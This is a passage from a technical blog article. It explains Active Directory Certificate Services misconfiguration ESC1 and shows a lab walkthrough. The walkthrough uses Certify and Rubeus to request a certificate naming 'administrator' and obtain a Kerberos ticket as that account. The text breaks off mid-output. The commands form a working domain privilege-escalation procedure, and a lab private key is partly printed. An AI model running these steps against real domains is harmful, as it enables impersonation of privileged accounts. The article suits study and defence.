<p>This step ensures that the <strong>certificate truly belongs to the user</strong> and that the request is <strong>authentic</strong>, preventing impersonation or spoofing attacks. If any of the checks above fail, the KDC denies the request. If the checks are successful, the KDC returns a TGT to the requesting client.</p><br/>
<p>The TGT can now be used to request <strong>Service Tickets (STs)</strong> for accessing desired services within the domain. Since this TGT was issued based on a certificate, it remains tied to the <strong>user identity specified in the certificate’s SAN</strong>, meaning authentication is strictly limited to that account.</p><br/>
<p>At this stage, ADCS exploitation might not seem particularly useful beyond <strong>persistence</strong>, as the certificate remains valid even if the user’s password changes. However, what if there were a way to <strong>specify an arbitrary subject</strong> when requesting a certificate?</p><br/>
<br/><h2>Subject Alternative Name (SAN)</h2><br/>
<p>The <strong>Subject Alternative Name (SAN)</strong> is a certificate extension that allows multiple identities to be associated with a single certificate, extending beyond just the <strong>Subject</strong> field. This is commonly used in <strong>HTTPS certificates</strong>, where a web server may host multiple domains and needs a single certificate that includes all applicable domain names within the <strong>SAN field</strong>.</p><br/>
<p>While this functionality is useful in web security, it can pose <strong>a critical security risk in Active Directory environments</strong> when combined with certificates that support <strong>domain authentication</strong>. As mentioned earlier, during the <strong>AS-REQ validation process</strong>, the <strong>KDC does not verify whether the requested username matches the Subject field of the certificate</strong>. In reality, it checks whether the username corresponds to a <strong>User Principal Name (UPN) or another identity field</strong> listed in the <strong>Subject Alternative Name (SAN) field</strong> of the certificate.</p><br/>
<p>This distinction is important because, during <strong>certificate-based authentication</strong>, Active Directory <strong>maps the certificate to a user account based on the UPN present in the SAN field</strong>, not the Subject field. This means that if a <strong>misconfigured certificate template</strong> allows a requester to specify an <strong>arbitrary SAN</strong>, and the CA signs and issues the certificate without proper validation, an attacker could <strong>impersonate any user in the domain</strong>, even if the <strong>Subject field— which identifies the original requester of the certificate— is completely different</strong>.</p><br/>
<p>This misconfiguration opens the door for <strong>domain privilege escalation</strong>, where a low-privileged user could request a certificate that includes the <strong>UPN of a privileged account (e.g., a Domain Admin)</strong> in the SAN field. Once issued, this certificate would allow the attacker to authenticate as that privileged account, effectively bypassing password-based authentication mechanisms.</p><br/>
<h3>Note</h3><br/>
<p>If you're not familiar with the term <strong>User Principal Name (UPN)</strong>, it is simply an identifier assigned to user accounts in <strong>Active Directory</strong>. By default, a UPN is automatically assigned when a new user is created and typically follows the format: <code>username@domain.local</code>. For example, if the user's <strong>sAMAccountName</strong> is <code>elswix</code>, their default UPN would be <code>elswix@elswixcorp.local</code>.</p><br/>
<p>However, the <strong>UPN is not strictly tied to this format</strong>—it can be manually modified by administrators to use a <strong>different domain suffix</strong> or even a <strong>completely different identifier</strong>. As a result, a user’s <strong>UPN may not always match their sAMAccountName (username) or follow the expected domain format</strong>.</p><br/>
<h3>Domain Escalation Abusing ADCS</h3><br/>
<p>Previously, we demonstrated how certificates can be used for <strong>domain authentication and persistence</strong>. Now, let's explore how <strong>misconfigurations in ADCS</strong> can lead to <strong>domain privilege escalation</strong>.</p><br/>
<p>During their research, the <strong>SpecterOps team</strong> introduced a <strong>categorization system</strong> for different <strong>ADCS misconfigurations and privilege escalation methods</strong>, naming them <strong>ESC vulnerabilities</strong>, followed by a number representing a specific technique. This classification helps define <strong>systematic ways attackers can abuse ADCS to escalate privileges</strong> within a domain.</p><br/>
<p>In this article (<strong>Part 1</strong>), we will focus on <strong>ESC1 through ESC8</strong>, which were the original privilege escalation techniques identified by SpecterOps. These vulnerabilities represent fundamental misconfigurations that, if present, allow an attacker to escalate privileges using improperly secured certificate templates, enrollment policies, or certificate-based authentication flaws.</p><br/>
<p>Later, in <strong>Part 2</strong>, we will explore <strong>more modern ADCS exploitation techniques</strong> discovered after SpecterOps' initial research, as mentioned at the beginning of this article.</p><br/>
<p>AD CS itself is not inherently insecure (with the exception of <strong>ESC8</strong>, as we’ll discuss later), but its complexity makes it surprisingly easy to misconfigure. These misconfigurations can create opportunities for <strong>low-privileged users to escalate privileges within the domain</strong>.</p><br/>
<h3>Misconfigured Certificate Templates (ESC1)</h3><br/>
<p>This is the first <strong>ADCS misconfiguration</strong> that can lead to <strong>domain privilege escalation</strong>. When a certificate template is vulnerable to <strong>ESC1</strong>, it allows an attacker to supply an <strong>arbitrary Subject Alternative Name (SAN)</strong> when requesting a certificate.</p><br/>
<p>By default, when a certificate is requested, the <strong>KDC automatically fills the SAN field with the UPN of the Subject</strong> specified in the Certificate Signing Request (<strong>CSR</strong>). However, certain templates are configured to allow the requester to <strong>explicitly define the SAN</strong>, meaning an attacker could <strong>set the SAN to the UPN of a privileged user, such as a Domain Admin</strong>, and obtain a valid authentication certificate for that identity.</p><br/>
<p>This insecure configuration can be found in the <strong>Subject Name</strong> tab of the certificate template properties, where the option <strong>"Supply in the Request"</strong> is enabled:</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/17/img/Cert-Services-4.png"/></p><br/>
<p>However, for <strong>ESC1 to be exploitable</strong>, this misconfiguration alone is <strong>not enough</strong>. Several other conditions must be met:</p><br/>
<h3>Additional Requirements for ESC1 Exploitation</h3><br/>
<br/><h3>The Enterprise CA Grants Low-Privileged Users Enrollment Rights</h3><br/>
<p>For an attacker to abuse a misconfigured certificate template, they must be <strong>allowed to enroll</strong> for a certificate. If certificate enrollment is restricted to privileged groups (e.g., only domain admins), exploitation is <strong>not possible</strong>.</p><br/>
<p>If <strong>low-privileged users</strong> have enrollment rights, they can freely request certificates, making exploitation possible.</p><br/>
<br/><h3>Manager Approval is Disabled</h3><br/>
<p>In some secure configurations, certificate requests must be <strong>manually approved</strong> by an administrator before being issued. This acts as a safeguard against unauthorized requests.</p><br/>
<p>For <strong>ESC1 to be exploitable</strong>, manager approval must be <strong>disabled</strong>, meaning that <strong>any request submitted will be automatically approved and issued</strong> by the CA.</p><br/>
<br/><h3>No Authorized Signatures Are Required</h3><br/>
<p>Some certificate templates require <strong>CSRs to be signed by an existing authorized certificate</strong> before the request is accepted. This adds another layer of security, as only users with pre-existing trusted certificates can request new ones.</p><br/>
<p>For ESC1 to work, <strong>this requirement must be disabled</strong>, allowing any user to submit an unsigned CSR and get a valid certificate.</p><br/>
<br/><h3>Overly Permissive Security Descriptors on the Certificate Template</h3><br/>
<p>Certificate templates have <strong>Access Control Lists (ACLs)</strong> that define which users or groups are allowed to <strong>read, enroll, or modify</strong> the template.</p><br/>
<p>For ESC1 to be exploited, the template must have <strong>"weak permissions"</strong>, meaning that <strong>low-privileged users are granted enrollment rights</strong>.</p><br/>
<p>This is often overlooked by administrators, as they might unknowingly allow <strong>Authenticated Users</strong> or <strong>Domain Users</strong> to enroll, opening the door for abuse.</p><br/>
<br/><h3>The Certificate Template Defines EKUs That Enable Authentication</h3><br/>
<p>Even if an attacker can enroll in a certificate template with a <strong>custom SAN</strong>, it is <strong>only useful for authentication if the certificate includes the correct EKUs (Extended Key Usages)</strong>.</p><br/>
<p>For exploitation, the template must include <strong>EKUs that allow authentication</strong>, such as:</p><br/>
<ul>
<li>
<p><strong>Client Authentication (1.3.6.1.5.5.7.3.2)</strong></p><br/>
</li>
<li>
<p><strong>Smart Card Logon (1.3.6.1.4.1.311.20.2.2)</strong></p><br/>
</li>
</ul>
<p>If the template lacks these <strong>EKUs</strong>, the attacker will be able to obtain a certificate, but it will not be usable for <strong>Kerberos authentication</strong>.</p><br/>
<p>For this demonstration I created a template called <code>ESC1</code>. This template meets all the requirements above so it can be exploited.</p><br/>
<h3>Finding a Vulnerable Template</h3><br/>
<p>Before requesting a certificate with an <strong>arbitrary SAN</strong>, we first need to identify vulnerable templates. To do this, we can use <strong>Certify.exe</strong>, a tool that not only automates <strong>certificate requests</strong> but also provides valuable insights into the <strong>ADCS environment</strong>.</p><br/>
<p>By using the <code>find</code> module with the <code>/vulnerable</code> flag, we can scan for templates that have <strong>misconfigurations allowing privilege escalation</strong>.</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">find</span> <span class="o">/</span><span class="n">vulnerable</span> 

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Find</span> <span class="n">certificate</span> <span class="n">templates</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">search</span> <span class="n">base</span> <span class="s1">'CN=Configuration,DC=elswixcorp,DC=local'</span>

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Vulnerable</span> <span class="n">Certificates</span> <span class="n">Templates</span> <span class="p">:</span>

    <span class="n">CA</span> <span class="n">Name</span>                               <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>
    <span class="n">Template</span> <span class="n">Name</span>                         <span class="p">:</span> <span class="n">ESC1</span>
    <span class="n">Schema</span> <span class="n">Version</span>                        <span class="p">:</span> <span class="mi">2</span>
    <span class="n">Validity</span> <span class="n">Period</span>                       <span class="p">:</span> <span class="mi">1</span> <span class="n">year</span>
    <span class="n">Renewal</span> <span class="n">Period</span>                        <span class="p">:</span> <span class="mi">6</span> <span class="n">weeks</span>
    <span class="n">msPKI</span><span class="o">-</span><span class="n">Certificate</span><span class="o">-</span><span class="n">Name</span><span class="o">-</span><span class="n">Flag</span>          <span class="p">:</span> <span class="n">ENROLLEE_SUPPLIES_SUBJECT</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">enrollment</span><span class="o">-</span><span class="n">flag</span>                 <span class="p">:</span> <span class="n">INCLUDE_SYMMETRIC_ALGORITHMS</span><span class="p">,</span> <span class="n">PUBLISH_TO_DS</span>
    <span class="n">Authorized</span> <span class="n">Signatures</span> <span class="n">Required</span>        <span class="p">:</span> <span class="mi">0</span>
    <span class="n">pkiextendedkeyusage</span>                   <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span>
    <span class="n">mspki</span><span class="o">-</span><span class="n">certificate</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">policy</span>  <span class="p">:</span> <span class="n">Client</span> <span class="n">Authentication</span>
    <span class="n">Permissions</span>
      <span class="n">Enrollment</span> <span class="n">Permissions</span>
        <span class="n">Enrollment</span> <span class="n">Rights</span>           <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Admins</span>      <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">512</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Domain</span> <span class="n">Users</span>       <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">513</span>
                                      <span class="n">ELSWIXCORP</span>\<span class="n">Enterprise</span> <span class="n">Admins</span>  <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span><span class="o">-</span><span class="mi">519</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">11.6553439</span>
</pre></div>
<p>As seen in the output, Certify has identified a <strong>vulnerable template</strong> named <code>ESC1</code> under the <strong>Certification Authority (CA)</strong> <code>DC02.elswixcorp.local\elswixcorp-DC02-CA</code>. The key detail here is the <strong><code>msPKI-Certificate-Name-Flag</code> attribute</strong>, which contains the flag <code>ENROLLEE_SUPPLIES_SUBJECT</code>. This flag indicates that the <strong>requester can specify an arbitrary SAN in the CSR</strong>, making it vulnerable to <strong>ESC1 exploitation</strong>.</p><br/>
<p>Moreover, it also includes the <code>Client Authentication</code> EKU, which enables domain authentication.</p><br/>
<h3>Note</h3><br/>
<p>You may have noticed that in the earlier <strong>authentication demonstration</strong>, I interacted with <code>elswixcorp-DC01-CA</code>. However, in this case, Certify found a vulnerable template in <strong><code>elswixcorp-DC02-CA</code></strong>, which is a <strong>Subordinate CA</strong> in my environment.</p><br/>
<p>I specifically created a <strong>second CA</strong> because the first one (<code>elswixcorp-DC01-CA</code>) has the <strong>latest security updates</strong>, which <strong>mitigate most of the attacks covered in Part 1</strong>. By using an <strong>older, unpatched CA</strong>, I can demonstrate the vulnerabilities/misconfigurations that were <strong>originally discovered</strong> in the SpecterOps research.</p><br/>
<p>Now, let's request a certificate using the <strong>ESC1</strong> template. The process is nearly identical to the one used in the earlier <strong>authentication demonstration</strong>, but this time, we need to <strong>explicitly specify a Subject Alternative Name (SAN)</strong> when making the request. This can be done using the <strong><code>/altname</code></strong> parameter in <strong>Certify</strong>:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">certify</span><span class="o">.</span><span class="n">exe</span> <span class="n">request</span> <span class="o">/</span><span class="n">ca</span><span class="p">:</span><span class="s2">"DC02.elswixcorp.local\elswixcorp-DC02-CA"</span> <span class="o">/</span><span class="n">template</span><span class="p">:</span><span class="s2">"ESC1"</span> <span class="o">/</span><span class="n">altname</span><span class="p">:</span><span class="n">administrator</span> 

   <span class="n">_____</span>          <span class="n">_</span>   <span class="n">_</span>  <span class="n">__</span>
  <span class="o">/</span> <span class="n">____</span><span class="o">|</span>        <span class="o">|</span> <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="p">)</span><span class="o">/</span> <span class="n">_</span><span class="o">|</span>
 <span class="o">|</span> <span class="o">|</span>     <span class="n">___</span> <span class="n">_</span> <span class="n">__</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">_</span>   <span class="n">_</span>
 <span class="o">|</span> <span class="o">|</span>    <span class="o">/</span> <span class="n">_</span> \ <span class="s1">'__| __| |  _| | | |</span>
 <span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span>
  \<span class="n">_____</span>\<span class="n">___</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>   \<span class="n">__</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span> <span class="o">|</span>
                             <span class="n">__</span><span class="o">/</span> <span class="o">|</span>
                            <span class="o">|</span><span class="n">___</span><span class="o">./</span>
  <span class="n">v1</span><span class="mf">.1.0</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Request</span> <span class="n">a</span> <span class="n">Certificates</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Current</span> <span class="n">user</span> <span class="n">context</span>    <span class="p">:</span> <span class="n">ELSWIXCORP</span>\<span class="n">elswix</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">No</span> <span class="n">subject</span> <span class="n">name</span> <span class="n">specified</span><span class="p">,</span> <span class="n">using</span> <span class="n">current</span> <span class="n">context</span> <span class="k">as</span> <span class="n">subject</span><span class="o">.</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Template</span>                <span class="p">:</span> <span class="n">ESC1</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Subject</span>                 <span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">AltName</span>                 <span class="p">:</span> <span class="n">administrator</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">Authority</span>   <span class="p">:</span> <span class="n">DC02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">elswixcorp</span><span class="o">-</span><span class="n">DC02</span><span class="o">-</span><span class="n">CA</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CA</span> <span class="n">Response</span>             <span class="p">:</span> <span class="n">The</span> <span class="n">certificate</span> <span class="n">had</span> <span class="n">been</span> <span class="n">issued</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Request</span> <span class="n">ID</span>              <span class="p">:</span> <span class="mi">18</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span>         <span class="p">:</span>

<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="n">MIIEpAIBAAKCAQEAz1</span><span class="o">/</span><span class="n">ePBmq3ly0EUUiPOl</span><span class="o">+</span><span class="n">SWgHeFFRhNLpOxisktQqjHlbDTht</span>
<span class="n">qY</span><span class="o">/</span><span class="n">BVYyjXHXiZiGAotF</span><span class="o">/</span><span class="n">rupIl9wAJrQB6Czn0TlGO0GeFw</span><span class="o">+</span><span class="n">OweYEq</span><span class="o">+</span><span class="n">g</span><span class="o">+</span><span class="n">zpnym9Vi</span>
<span class="n">zVF</span><span class="o">+</span><span class="n">hNQfg6NLsb</span><span class="o">+</span><span class="mi">9</span><span class="n">DY6iyuM80nBOysT</span><span class="o">/</span><span class="n">ub15qX2sv0uw0AvvBdwVHQHM9mZcomdv</span>
<span class="n">LOmAulKexnU9beCd</span><span class="o">/</span><span class="n">wwsqSnNQN23w0wY7W62b1g0V24QV16iyJ</span><span class="o">+</span><span class="n">olSV1jUHvgtav</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">wmeqQKBgQDlQpH2e2MQnWqbbmxxQuezPFZFTvbKh29Hnzzw</span><span class="o">+</span><span class="n">gxsmTH9DrRiVmLk</span>
<span class="mi">7</span><span class="n">RIyYA4i5rpceicAPkhtKM5QFkLfAeWdjV1dyXm9EPmO</span><span class="o">/</span><span class="n">i4iBG28TiDlhqLZUNdd</span>
<span class="o">/</span><span class="mi">5</span><span class="n">bQWQsYI6maIguutOHH1b3plZ16TBLReIoBrqQQxWRb1</span><span class="o">+</span><span class="n">YehsrpQg</span><span class="o">==</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">RSA</span> <span class="n">PRIVATE</span> <span class="n">KEY</span><span class="o">-----</span>
<span class="o">-----</span><span class="n">BEGIN</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>
<span class="n">MIIGCDCCBPCgAwIBAgITPgAAABJ44vNEkStfQgAAAAAAEjANBgkqhkiG9w0BAQsF</span>
<span class="n">ADBQMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk</span><span class="o">/</span><span class="n">IsZAEZFgplbHN3</span>
<span class="n">aXhjb3JwMRswGQYDVQQDExJlbHN3aXhjb3JwLURDMDItQ0EwHhcNMjUwMzIzMTcy</span>
<span class="n">NTI5WhcNMjYwMzIzMTcyNTI5WjBUMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAY</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="mi">2</span><span class="n">aZFpu84UtihZgww</span><span class="o">/</span><span class="n">xC91HN0LwMng9PM68h</span><span class="o">/</span><span class="n">DGZk8yGuLCd4BTVJ2JKRupIWRgp1</span>
<span class="n">xbENKKwOzvbkDz8</span><span class="o">/</span><span class="n">OVqAuIErpRI5fXxLrL0jfJfc0pI</span><span class="o">/</span><span class="n">UO2gu</span><span class="o">/</span><span class="n">m4BZ2h9ZBQiicN</span>
<span class="mi">5</span><span class="n">N7lVbjTW3gTafrYuLwWC4nCf</span><span class="o">+</span><span class="n">gJHsnJm3yKmhCNrD2cgRFVoIYVcHslZsj9ExuQ</span>
<span class="n">F</span><span class="o">+</span><span class="n">gcOsQvZa52uDskZiK</span><span class="o">+</span><span class="n">IJWw9HaGU</span><span class="o">/</span><span class="n">w3FWbQ</span><span class="o">+</span><span class="n">Ef</span><span class="o">+</span><span class="n">sZZQIIp6ssUb7po0AbWqsKj9</span>
<span class="mi">7</span><span class="n">wgTFy5HuYRiSvTuTUYi5reGKn8x2Yeh6UtmHXUKOmRSQ</span><span class="o">/</span><span class="n">V0AdPaJ3Bu80O</span><span class="o">/</span><span class="n">iuRs</span>
<span class="n">kFm82p5JAnmgnMAQ</span>
<span class="o">-----</span><span class="n">END</span> <span class="n">CERTIFICATE</span><span class="o">-----</span>


<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Convert</span> <span class="k">with</span><span class="p">:</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>

<span class="n">Certify</span> <span class="n">completed</span> <span class="ow">in</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mf">15.2464748</span>
</pre></div>
<p>Once the certificate is issued, I transfer the <strong>private key</strong> and the <strong>certificate</strong> to my <strong>Linux machine</strong> and use <strong>OpenSSL</strong> to convert them into a <strong>PFX file</strong>. This step is necessary because <strong>PFX files contain both the private key and certificate</strong>, making them usable for authentication:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">openssl</span> <span class="n">pkcs12</span> <span class="o">-</span><span class="ow">in</span> <span class="n">cert</span><span class="o">.</span><span class="n">pem</span> <span class="o">-</span><span class="n">keyex</span> <span class="o">-</span><span class="n">CSP</span> <span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span> <span class="o">-</span><span class="n">export</span> <span class="o">-</span><span class="n">out</span> <span class="n">cert</span><span class="o">.</span><span class="n">pfx</span>
<span class="n">Enter</span> <span class="n">Export</span> <span class="n">Password</span><span class="p">:</span>
<span class="n">Verifying</span> <span class="o">-</span> <span class="n">Enter</span> <span class="n">Export</span> <span class="n">Password</span><span class="p">:</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>During the conversion process, OpenSSL allows you to set a <strong>password</strong> for the PFX file. In this case, I simply pressed <strong>Enter twice</strong>, meaning the resulting <strong>PFX file is not password-protected</strong>.</p><br/>
<h3>Using the Certificate to Obtain a TGT</h3><br/>
<p>Next, I upload the <strong><code>cert.pfx</code></strong> file to the <strong>victim machine</strong>. With <strong>Rubeus</strong>, I then request a <strong>TGT (Ticket Granting Ticket)</strong> using the newly obtained certificate:</p><br/>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span><span class="o">&gt;</span> <span class="o">.</span>\<span class="n">Rubeus</span><span class="o">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="o">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span> <span class="o">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">C</span><span class="p">:</span>\<span class="n">tmp</span>\<span class="n">cert</span><span class="o">.</span><span class="n">pfx</span> <span class="o">/</span><span class="n">dc</span><span class="p">:</span><span class="n">dc02</span><span class="o">.</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>

   <span class="n">______</span>        <span class="n">_</span>
  <span class="p">(</span><span class="n">_____</span> \      <span class="o">|</span> <span class="o">|</span>
   <span class="n">_____</span><span class="p">)</span> <span class="p">)</span><span class="n">_</span>   <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">__</span>  <span class="n">_____</span> <span class="n">_</span>   <span class="n">_</span>  <span class="n">___</span>
  <span class="o">|</span>  <span class="n">__</span>  <span class="o">/|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">_</span> \<span class="o">|</span> <span class="n">___</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|/</span><span class="n">___</span><span class="p">)</span>
  <span class="o">|</span> <span class="o">|</span>  \ \<span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="p">)</span> <span class="p">)</span> <span class="n">____</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span> <span class="o">|</span>
  <span class="o">|</span><span class="n">_</span><span class="o">|</span>   <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">____</span><span class="o">/|</span><span class="n">____</span><span class="o">/|</span><span class="n">_____</span><span class="p">)</span><span class="n">____</span><span class="o">/</span><span class="p">(</span><span class="n">___</span><span class="o">/</span>

  <span class="n">v2</span><span class="mf">.3.3</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">Ask</span> <span class="n">TGT</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">domain</span><span class="p">:</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">PKINIT</span> <span class="k">with</span> <span class="n">etype</span> <span class="n">rc4_hmac</span> <span class="ow">and</span> <span class="n">subject</span><span class="p">:</span> <span class="n">CN</span><span class="o">=</span><span class="n">elswix</span><span class="p">,</span> <span class="n">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">elswixcorp</span><span class="p">,</span> <span class="n">DC</span><span class="o">=</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Building</span> <span class="n">AS</span><span class="o">-</span><span class="n">REQ</span> <span class="p">(</span><span class="n">w</span><span class="o">/</span> <span class="n">PKINIT</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">'elswixcorp.local</span><span class="se">\a</span><span class="s1">dministrator'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">fe80</span><span class="p">::</span><span class="mi">8486</span><span class="p">:</span><span class="mi">53</span><span class="n">c9</span><span class="p">:</span><span class="mi">7</span><span class="n">ec5</span><span class="p">:</span><span class="mi">93</span><span class="n">ed</span><span class="o">%</span><span class="mi">5</span><span class="p">:</span><span class="mi">88</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">TGT</span> <span class="n">request</span> <span class="n">successful</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">base64</span><span class="p">(</span><span class="n">ticket</span><span class="o">.</span><span class="n">kirbi</span><span class="p">):</span>

